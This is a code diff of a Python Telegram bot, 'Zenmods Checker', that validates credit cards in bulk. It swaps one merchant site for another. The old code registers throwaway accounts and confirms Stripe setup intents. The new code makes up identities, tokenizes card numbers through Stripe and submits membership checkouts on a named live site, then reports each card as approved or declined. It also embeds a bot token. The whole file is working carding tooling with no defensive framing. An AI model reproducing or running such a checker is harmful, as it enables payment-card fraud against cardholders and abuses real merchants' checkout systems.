@@ -8,6 +8,7 @@ import threading
 import time
 from bs4 import BeautifulSoup
 import requests
+import names
 import telebot
 
 TELEGRAM_BOT_TOKEN = "8664861867:AAF5Wq79aekFKDcE6vFT2jFO_3w4jjFgLmk"
@@ -46,213 +47,116 @@ def print_cyan(text): print(f"\033[96m{text}\033[0m")
 def print_white(text): print(f"\033[97m{text}\033[0m")
 def print_grey(text): print(f"\033[90m{text}\033[0m")
 
-def gggggggggggggggggg(length=9, domain=None):
-    common_domains = ["gmail.com"]
-    if not domain:
-        domain = random.choice(common_domains)
-    username_characters = string.ascii_letters + string.digits
-    username = ''.join(random.choice(username_characters) for _ in range(length))
-    return f"{username}@{domain}"
-
-def create_session():
-    try:
-        session = requests.Session()
-        email = gggggggggggggggggg()
-        headers = {
-            'authority': 'www.thetravelinstitute.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-        }
-        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
-        if response.status_code != 200:
-            return None, f"[SITE SIDE ISSUE] Register GET failed with status {response.status_code}"
-            
-        html = response.text
-        soup = BeautifulSoup(html, 'html.parser')
-        
-        nonce_tag = soup.find('input', {'id': 'afurd_field_nonce'})
-        noncee_tag = soup.find('input', {'id': 'woocommerce-register-nonce'})
-        
-        if not nonce_tag or not noncee_tag:
-            return None, "[SITE SIDE ISSUE] Registration form nonces missing or blocked by target site WAF/Security."
-            
-        nonce = nonce_tag['value']
-        noncee = noncee_tag['value']
-        
-        headers = {
-            'authority': 'www.thetravelinstitute.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://www.thetravelinstitute.com',
-            'referer': 'https://www.thetravelinstitute.com/register/',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-        }
-        data = [
-            ('afurd_field_nonce', f'{nonce}'),
-            ('_wp_http_referer', '/register/'),
-            ('pre_page', ''),
-            ('email', f'{email}'),
-            ('password', 'rokyNoa5954J'),
-            ('wc_order_attribution_source_type', 'typein'),
-            ('wc_order_attribution_referrer', 'https://www.thetravelinstitute.com/my-account/payment-methods/'),
-            ('wc_order_attribution_utm_campaign', '(none)'),
-            ('wc_order_attribution_utm_source', '(direct)'),
-            ('wc_order_attribution_utm_medium', '(none)'),
-            ('wc_order_attribution_utm_content', '(none)'),
-            ('wc_order_attribution_utm_id', '(none)'),
-            ('wc_order_attribution_utm_term', '(none)'),
-            ('wc_order_attribution_utm_source_platform', '(none)'),
-            ('wc_order_attribution_utm_creative_format', '(none)'),
-            ('wc_order_attribution_utm_marketing_tactic', '(none)'),
-            ('wc_order_attribution_session_entry', 'https://www.thetravelinstitute.com/my-account/add-payment-method/'),
-            ('wc_order_attribution_session_start_time', '2024-11-17 09:43:38'),
-            ('wc_order_attribution_session_pages', '8'),
-            ('wc_order_attribution_session_count', '1'),
-            ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'),
-            ('woocommerce-register-nonce', f'{noncee}'),
-            ('_wp_http_referer', '/register/'),
-            ('register', 'Register'),
-        ]
-        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
-        if response.status_code == 200:
-            return session, "Success"
-        else:
-            return None, f"[SITE SIDE ISSUE] Register POST failed with status {response.status_code}"
-    except Exception as e:
-        return None, f"[SITE/NETWORK ISSUE] Exception during session creation -> {str(e)}"
-
-def save_session_to_file(session, file_path):
-    with open(file_path, "w") as file:
-        cookies = session.cookies.get_dict()
-        file.write(str(cookies))
-
-def load_session_from_file(file_path):
-    try:
-        with open(file_path, "r") as file:
-            session_data = file.read().strip()
-            session = requests.Session()
-            cookies = eval(session_data)
-            session.cookies.update(cookies)
-            return session
-    except Exception as e:
-        return None
-
-def manage_session_file():
-    session_file = "anasxzer00-session.txt"
-    if os.path.exists(session_file):
-        session = load_session_from_file(session_file)
-        if session:
-            return session, "Loaded from cache"
-    session, err_msg = create_session()
-    if session:
-        save_session_to_file(session, session_file)
-        return session, "Created new session"
+def detectar_tipo_tarjeta(cc):
+    if cc.startswith("4"):
+        return "Visa"
+    elif cc.startswith("5"):
+        return "MasterCard"
+    elif cc.startswith("3"):
+        return "American Express"
+    elif cc.startswith("6"):
+        return "Discover"
     else:
-        return None, err_msg
+        return "Desconocido"
 
-def check_single_cc(cc_line, session):
+def check_single_cc(cc_line):
     try:
         card = cc_line.replace('/', '|')
-        lista = card.split("|")
-        if len(lista) < 4:
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\n[FORMAT ERROR] Invalid card format structure"
+        partes = card.split("|")
+        if len(partes) < 4:
+            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nReason: Invalid format structure"
         
-        cc = lista[0]
-        mm = lista[1]
-        yy = lista[2]
-        if "20" in yy:
-            yy = yy.split("20")[1]
-        cvv = lista[3]
+        cc = partes[0]
+        mes = partes[1]
+        ano = partes[2]
+        if "20" in ano:
+            ano = ano.split("20")[1]
+        cvv = partes[3]
 
+        vendor = detectar_tipo_tarjeta(cc)
+        username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
+        correo_rand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
+        password = f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
+
+        session = requests.Session()
+
+        # REQ1: Get Nonce
         headers = {
-            'authority': 'www.thetravelinstitute.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
         }
-        response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers, timeout=20)
+        response = session.get('https://www.streamland.ro/membership-account/membership-checkout/', headers=headers, timeout=20)
         if response.status_code != 200:
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\n[SITE SIDE ISSUE] Failed to load payment page (Status: {response.status_code})"
-            
-        html = response.text
-        nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html)
-        if not nonce_match:
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\n[SITE SIDE ISSUE] Setup intent nonce not found on site. Session might have expired."
-        nonce = nonce_match.group(1)
+            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: Checkout page GET failed (Status: {response.status_code})"
 
-        headers_stripe = {
-            'authority': 'api.stripe.com',
-            'accept': 'application/json',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://www.thetravelinstitute.com',
-            'referer': 'https://www.thetravelinstitute.com/',
-            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'cross-site',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-            'x-stripe-client-user-agent': '{"init_source":"elements-inner","plugin_name":"stripe.js","lang":"en","bindings_version":"2.20.0","os":"win","browser":"chrome"}',
+        nonce_tag = (BeautifulSoup(response.text, 'html.parser')).find("input", {"name": "woocommerce-register-nonce"})
+        if not nonce_tag:
+            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: Register nonce not found"
+
+        # REQ2: Stripe MUID/GUID/SID
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
         }
-        data_stripe = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
+        stripe_init = session.post('https://m.stripe.com/6', headers=headers, timeout=20).json()
+        muid = stripe_init.get('muid', '')
+        guid = stripe_init.get('guid', '')
+        sid = stripe_init.get('sid', '')
+
+        # REQ3: Stripe Tokenization
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
+        }
+        data_token = f'time_on_page={random.randint(10,99999)}&pasted_fields=email&guid={guid}&muid={muid}&sid={sid}&key=pk_live_APZPK16BMAmVqyx5GXaAgfGh&payment_user_agent=stripe.js%2F78{random.randint(10000,99999)}e{random.randint(1,9)}%3B+stripe-js-v3%2F{random.randint(1,9)}c{random.randint(1000,9999)}{random.randint(1,9)}e{random.randint(1,9)}&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[cvc]={cvv}'
+
+        token_res = session.post('https://api.stripe.com/v1/tokens', headers=headers, data=data_token, timeout=20).json()
+        if 'id' not in token_res:
+            err_msg = token_res.get('error', {}).get('message', 'Unknown tokenization error')
+            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: {err_msg}"
         
-        stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, timeout=20)
-        res = stripe_response.text
-        
-        if 'error' in res:
-            try:
-                error = stripe_response.json()['error']['message']
-            except Exception:
-                error = "Unknown Stripe Error"
-            
-            # API / Gateway Level Issue Identification
-            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\n[API / GATEWAY ISSUE] Stripe responded with error: {error}"
+        id_ = token_res['id']
+
+        # REQ4: Checkout Submission
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
+        }
+        data_checkout = {
+            'level': '2',
+            'checkjavascript': '1',
+            'username': username,
+            'password': password,
+            'password2': password,
+            'bemail': correo_rand,
+            'bconfirmemail': correo_rand,
+            'fullname': '',
+            'CardType': vendor,
+            'tos': '1',
+            'submit-checkout': '1',
+            'javascriptok': '1',
+            'stripeToken0': id_,
+            'AccountNumber': f'XXXXXXXXXXXX{cc[12:]}',
+            'ExpirationMonth': mes,
+            'ExpirationYear': ano,
+        }
+
+        checkout_res = session.post('https://www.streamland.ro/membership-account/membership-checkout/', headers=headers, data=data_checkout, timeout=20).text
+        response_code = (BeautifulSoup(checkout_res, 'html.parser')).find(class_="pmpro_message pmpro_error", id='pmpro_message')
+
+        error_message = response_code.get_text() if response_code else checkout_res
+
+        if "Your card's security code is incorrect." in error_message:
+            return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nStatus: Your card's security code is incorrect."
+        elif "Your card has insufficient funds." in error_message:
+            return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\nStatus: Your card has insufficient funds."
+        elif "succeeded" in error_message or "pmpro_success" in checkout_res:
+            return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\nStatus: CHARGE SUCCESSFUL!"
         else:
-            try:
-                iddd = stripe_response.json()['id']
-            except Exception:
-                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\n[API ISSUE] Failed to extract payment method ID from Stripe response."
+            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: {error_message.strip()}"
 
-            headers_confirm = {
-                'authority': 'www.thetravelinstitute.com',
-                'accept': '*/*',
-                'accept-language': 'en-US,en;q=0.9',
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'origin': 'https://www.thetravelinstitute.com',
-                'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-                'x-requested-with': 'XMLHttpRequest',
-            }
-            params = {
-                'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
-            }
-            data_confirm = {
-                'action': 'create_and_confirm_setup_intent',
-                'wc-stripe-payment-method': iddd,
-                'wc-stripe-payment-type': 'card',
-                '_ajax_nonce': nonce,
-            }
-            confirm_response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers_confirm, data=data_confirm, timeout=20)
-            
-            try:
-                res_json = confirm_response.json()
-            except Exception:
-                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\n[SITE SIDE ISSUE] Invalid AJAX confirmation JSON response from site."
-
-            if res_json.get('success') == False:
-                error = res_json.get('data', {}).get('error', {}).get('message', 'Unknown confirmation error')
-                return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\n[SITE/API GATEWAY ISSUE] Setup intent confirmation failed: {error}"
-            else:
-                return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\n[SUCCESS] Setup intent confirmed successfully!"
     except Exception as e:
-        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\n[NETWORK / SCRIPT EXCEPTION] -> {str(e)}"
+        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nReason: Exception -> {str(e)}"
 
 def process_bulk_file(chat_id, file_content):
     lines = [line.strip() for line in file_content.decode("utf-8").splitlines() if line.strip()]
@@ -262,25 +166,19 @@ def process_bulk_file(chat_id, file_content):
         bot.send_message(chat_id, "⚠️ File is empty or no cards found!")
         return
 
-    bot.send_message(chat_id, f"⚡ **Zenmods Smart Diagnostic Engine** ⚡\nTotal cards: `{total_cards}`.\n🚀 Checking one by one with deep error tracing...")
-
-    session, session_status = manage_session_file()
-    if not session:
-        bot.send_message(chat_id, f"❌ **Session creation failed!**\n\n🔍 **Source Diagnosis:** `{session_status}`")
-        return
-    else:
-        bot.send_message(chat_id, f"✅ Session status: `{session_status}`")
+    bot.send_message(chat_id, f"⚡ **Zenmods Streamland Sequential Engine** ⚡\nTotal cards: `{total_cards}`.\n🚀 Checking strictly 1 by 1 in real-time...")
 
     for index, card_line in enumerate(lines, start=1):
-        res = check_single_cc(card_line, session)
-        bot.send_message(chat_id, f"📌 **Report [{index}/{total_cards}]**:\n\n{res}")
+        res = check_single_cc(card_line)
+        # প্রতিটি কার্ড চেক শেষ হওয়া মাত্রই সিঙ্গেল মেসেজ সেন্ড করবে
+        bot.send_message(chat_id, f"📌 **Result [{index}/{total_cards}]**:\n\n{res}")
         time.sleep(2)
 
-    bot.send_message(chat_id, "🏁 **All checks completed with full source diagnostics!**")
+    bot.send_message(chat_id, "🏁 **All cards checked successfully!**")
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.reply_to(message, "Welcome to Zenmods Checker Bot! Send /auth <code > to authorize or upload a text file with combos.")
+    bot.reply_to(message, "Welcome to Zenmods Streamland Checker Bot! Send /auth <code > to authorize or upload a text file.")
 
 @bot.message_handler(commands=['auth'])
 def authorize_user(message):
@@ -307,14 +205,9 @@ def handle_single_card_cmd(message):
         return
     
     card_line = parts[1].strip()
-    bot.send_message(chat_id, "🔍 Running single card diagnosis...")
-    session, session_status = manage_session_file()
-    if not session:
-        bot.send_message(chat_id, f"❌ **Session failed!**\n\n🔍 **Source Diagnosis:** `{session_status}`")
-        return
-    
-    res = check_single_cc(card_line, session)
-    bot.send_message(chat_id, f"📌 **Detailed Single Report:**\n\n{res}")
+    bot.send_message(chat_id, "🔍 Checking single card...")
+    res = check_single_cc(card_line)
+    bot.send_message(chat_id, f"📌 **Single Card Report:**\n\n{res}")
 
 @bot.message_handler(content_types=['document'])
 def handle_document(message):
